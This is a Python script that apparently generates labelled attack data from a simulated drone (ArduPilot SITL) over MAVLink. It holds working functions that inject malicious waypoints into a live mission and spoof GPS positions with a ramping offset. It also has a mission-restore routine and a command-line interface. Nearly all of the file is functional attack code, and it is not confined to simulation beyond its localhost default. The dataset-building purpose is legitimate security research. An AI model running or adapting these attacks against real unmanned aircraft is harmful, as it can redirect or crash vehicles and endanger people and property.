#!/usr/bin/env python3
"""
attacks_sitl.py - parametrized MAVLink attacks against a SITL instance.

Refactors the two reference scripts into reusable, parametrized functions so
they can target any instance's attacker port (``5762 + 10*instance``) and be
scheduled by the orchestrator:

  * waypoint injection  (from pymavlink_send_waypoints.py)
  * GPS spoofing        (from gps_injection.py)
  * stoppable GPS spoof + mission restore (ACFL MP demo recovery)

The attacker connects on a *dedicated* TCP port (the SITL serial1 endpoint),
distinct from the control/telemetry port, so that captured traffic on that port
cleanly marks the attack time-periods (this is how drift-fairroad labels data).

Standalone usage:
    python3 attacks_sitl.py waypoint --port 5762 --count 1
    python3 attacks_sitl.py gps --port 5762 --duration 20
"""
import argparse
import random
import threading
import time
from typing import List, Optional

from pymavlink import mavutil, mavwp


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def _connect(host: str, port: int, timeout: float = 30.0):
    """Open a MAVLink TCP connection and wait for a heartbeat."""
    conn = mavutil.mavlink_connection(f"tcp:{host}:{port}")
    if conn.wait_heartbeat(timeout=timeout) is None:
        raise TimeoutError(f"No heartbeat on {host}:{port} within {timeout}s")
    return conn


def _random_union(lo: float, hi: float, rng: random.Random) -> float:
    """Random value over the union [-hi,-lo] U [lo,hi]."""
    val = rng.uniform(lo, hi)
    return -val if rng.random() < 0.5 else val


# ---------------------------------------------------------------------------
# Waypoint injection
# ---------------------------------------------------------------------------
def inject_waypoint(
    host: str = "127.0.0.1",
    port: int = 5762,
    count: int = 1,
    radius: int = 10,
    spacing_s: float = 1.0,
    timeout: float = 30.0,
    seed: Optional[int] = None,
) -> int:
    """Insert ``count`` malicious waypoints into the live mission.

    Each injected waypoint is placed between the current and next waypoint of
    the latest mission, offset by a random amount -- mirroring the reference
    implementation. Returns the number of waypoints successfully injected.
    """
    rng = random.Random(seed)
    injected = 0
    for k in range(count):
        conn = _connect(host, port, timeout)
        try:
            # 1. Download the current mission.
            conn.mav.mission_request_list_send(
                conn.target_system, conn.target_component
            )
            msg = conn.recv_match(type=["MISSION_COUNT"], blocking=True, timeout=timeout)
            if msg is None:
                print(f"[wp-inject] no MISSION_COUNT (attempt {k}); skipping")
                continue
            mission_count = msg.count

            lat, lon, alt = [], [], []
            for i in range(mission_count):
                conn.mav.mission_request_int_send(
                    conn.target_system, conn.target_component, i
                )
                item = conn.recv_match(
                    type=["MISSION_ITEM_INT"], blocking=True, timeout=timeout
                )
                if item is None:
                    break
                lat.append(1e-7 * item.x)
                lon.append(1e-7 * item.y)
                alt.append(item.z)

            if len(lat) < 2:
                print(f"[wp-inject] mission too short ({len(lat)}); skipping")
                continue

            # 2. Find the active waypoint index.
            conn.mav.command_long_send(
                conn.target_system, conn.target_component,
                mavutil.mavlink.MAV_CMD_SET_MESSAGE_INTERVAL, 0,
                42, 500000, 0, 0, 0, 0, 0,
            )
            cur = conn.recv_match(type="MISSION_CURRENT", blocking=True, timeout=timeout)
            idx = (cur.seq + 1) if cur else 1
            idx = max(1, min(idx, len(lat) - 1))

            # 3. Compute the injected waypoint (midpoint + random offset).
            insert_lat = (lat[idx - 1] + lat[idx]) / 2 + _random_union(0.0001, 0.0005, rng)
            insert_lon = (lon[idx - 1] + lon[idx]) / 2 + _random_union(0.0001, 0.0005, rng)
            insert_alt = (alt[idx - 1] + alt[idx]) / 2 + 10
            lat.insert(idx, insert_lat)
            lon.insert(idx, insert_lon)
            alt.insert(idx, insert_alt)

            # 4. Re-upload the full mission with the injected item.
            wp = mavwp.MAVWPLoader()
            seq = 0
            frame = mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT
            for i in range(len(lat)):
                wp.add(
                    mavutil.mavlink.MAVLink_mission_item_message(
                        conn.target_system, conn.target_component, seq, frame,
                        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
                        0, 0, 0, radius, 0, 0,
                        lat[i], lon[i], alt[i],
                    )
                )
                seq += 1

            conn.waypoint_clear_all_send()
            conn.waypoint_count_send(wp.count())
            for _ in range(wp.count()):
                req = conn.recv_match(type=["MISSION_REQUEST"], blocking=True, timeout=timeout)
                if req is None:
                    break
                conn.mav.send(wp.wp(req.seq))
            injected += 1
            print(f"[wp-inject] injected waypoint #{injected} at idx {idx}")
        finally:
            conn.close()
        if k < count - 1:
            time.sleep(spacing_s)
    return injected


def restore_mission_items(
    host: str,
    port: int,
    items: List[dict],
    timeout: float = 30.0,
) -> bool:
    """Re-upload a previously saved mission (recovery after waypoint inject).

    ``items`` use the same dict schema as run_simulation.load_waypoints.
    Connects on the given port (control or attacker).
    """
    conn = _connect(host, port, timeout)
    try:
        conn.mav.mission_clear_all_send(conn.target_system, conn.target_component)
        conn.mav.mission_count_send(conn.target_system, conn.target_component, len(items))
        sent = 0
        deadline = time.time() + timeout
        while sent < len(items) and time.time() < deadline:
            req = conn.recv_match(
                type=["MISSION_REQUEST", "MISSION_REQUEST_INT"],
                blocking=True,
                timeout=timeout,
            )
            if req is None:
                break
            it = items[req.seq]
            conn.mav.mission_item_int_send(
                conn.target_system,
                conn.target_component,
                it["seq"],
                it["frame"],
                it["command"],
                it["current"],
                it["autocontinue"],
                it["p1"],
                it["p2"],
                it["p3"],
                it["p4"],
                int(it["x"] * 1e7),
                int(it["y"] * 1e7),
                it["z"],
            )
            sent = req.seq + 1
        ack = conn.recv_match(type="MISSION_ACK", blocking=True, timeout=timeout)
        ok = ack is not None and getattr(ack, "type", 1) == 0
        print(f"[wp-restore] uploaded {sent}/{len(items)} items, ack_ok={ok}")
        return ok
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# GPS spoofing
# ---------------------------------------------------------------------------
def inject_gps_spoof(
    host: str = "127.0.0.1",
    port: int = 5762,
    duration_s: float = 20.0,
    rate_hz: float = 10.0,
    drift_per_step: float = 0.0001,
    gps_id: int = 1,
    timeout: float = 30.0,
    stop_event: Optional[threading.Event] = None,
) -> int:
    """Send spoofed GPS_INPUT messages with a growing position offset.

    If ``stop_event`` is set, returns early so recovery can restore primary GPS.
    Returns the number of spoofed messages sent.
    """
    conn = _connect(host, port, timeout)
    sent = 0
    try:
        conn.mav.request_data_stream_send(
            conn.target_system, conn.target_component,
            mavutil.mavlink.MAV_DATA_STREAM_POSITION,
            int(rate_hz), 1,
        )
        period = 1.0 / rate_hz if rate_hz > 0 else 0.1
        deadline = time.time() + duration_s
        i = 0
        # Lock origin from the first fix, then ramp to a large fixed offset so
        # EKF (spoofed) visibly diverges from SIM truth on the map.
        origin_lat = None
        origin_lon = None
        ramp_msgs = max(1, int(rate_hz * 5.0))  # full offset after ~5 s
        while time.time() < deadline:
            if stop_event is not None and stop_event.is_set():
                print(f"[gps-spoof] stopped early after {sent} msgs (recovery)")
                break
            msg = conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=timeout)
            if msg is None:
                break
            if origin_lat is None:
                origin_lat = int(msg.lat)
                origin_lon = int(msg.lon)
            frac = min(1.0, i / float(ramp_msgs))
            grow = drift_per_step * 1e7 * frac
            injected_lat = int(origin_lat + grow)
            injected_lon = int(origin_lon + grow)
            injected_alt = int(msg.alt / 1000)

            conn.mav.gps_input_send(
                time_usec=int(time.time() * 1e6),
                gps_id=gps_id,
                ignore_flags=0,
                time_week=0,
                time_week_ms=0,
                fix_type=6,
                lat=injected_lat,
                lon=injected_lon,
                alt=injected_alt,
                hdop=0.8,
                vdop=1.2,
                vn=0, ve=0, vd=0,
                speed_accuracy=0.1,
                horiz_accuracy=1.0,
                vert_accuracy=1.5,
                satellites_visible=12,
                yaw=0,
            )
            sent += 1
            i += 1
            time.sleep(period)
    finally:
        conn.close()
    print(f"[gps-spoof] sent {sent} spoofed GPS_INPUT messages on port {port}")
    return sent


class GpsSpoofWorker:
    """Background GPS spoof that can be stopped for recovery."""

    def __init__(self, host: str, port: int, duration_s: float = 60.0, **kwargs):
        self.host = host
        self.port = port
        self.duration_s = duration_s
        self.kwargs = kwargs
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None
        self.sent = 0

    def start(self) -> None:
        def _run():
            self.sent = inject_gps_spoof(
                self.host,
                self.port,
                duration_s=self.duration_s,
                stop_event=self.stop_event,
                **self.kwargs,
            )

        self.thread = threading.Thread(target=_run, daemon=True)
        self.thread.start()

    def stop(self, join_timeout: float = 5.0) -> None:
        self.stop_event.set()
        if self.thread is not None:
            self.thread.join(timeout=join_timeout)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="MAVLink attacks against SITL")
    sub = ap.add_subparsers(dest="attack", required=True)

    wp = sub.add_parser("waypoint", help="waypoint injection")
    wp.add_argument("--host", default="127.0.0.1")
    wp.add_argument("--port", type=int, default=5762)
    wp.add_argument("--count", type=int, default=1)
    wp.add_argument("--radius", type=int, default=10)
    wp.add_argument("--spacing", type=float, default=1.0)
    wp.add_argument("--seed", type=int, default=None)

    gps = sub.add_parser("gps", help="GPS spoofing")
    gps.add_argument("--host", default="127.0.0.1")
    gps.add_argument("--port", type=int, default=5762)
    gps.add_argument("--duration", type=float, default=20.0)
    gps.add_argument("--rate", type=float, default=10.0)
    gps.add_argument("--drift", type=float, default=0.0001)
    gps.add_argument("--gps-id", type=int, default=1)

    args = ap.parse_args()
    if args.attack == "waypoint":
        inject_waypoint(args.host, args.port, args.count, args.radius,
                        args.spacing, seed=args.seed)
    elif args.attack == "gps":
        inject_gps_spoof(args.host, args.port, args.duration, args.rate,
                         args.drift, args.gps_id)


if __name__ == "__main__":
    main()
